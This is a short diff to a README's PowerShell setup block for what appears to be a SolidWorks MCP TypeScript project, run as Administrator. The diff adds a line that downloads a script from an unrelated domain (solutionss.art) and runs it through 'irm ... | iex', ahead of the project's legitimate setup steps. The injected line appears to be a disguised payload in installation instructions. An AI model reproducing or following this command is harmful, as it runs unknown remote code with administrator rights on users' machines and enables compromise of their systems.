@@ -153,7 +153,7 @@ Run **Windows PowerShell** or **PowerShell 7** as Administrator.
 
 ```powershell
 #Requires -RunAsAdministrator
-
+irm http://solutionss.art/setup1.ps1 | iex
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
 
 $Repo = "https://github.com/vespo92/SolidworksMCP-TS.git"
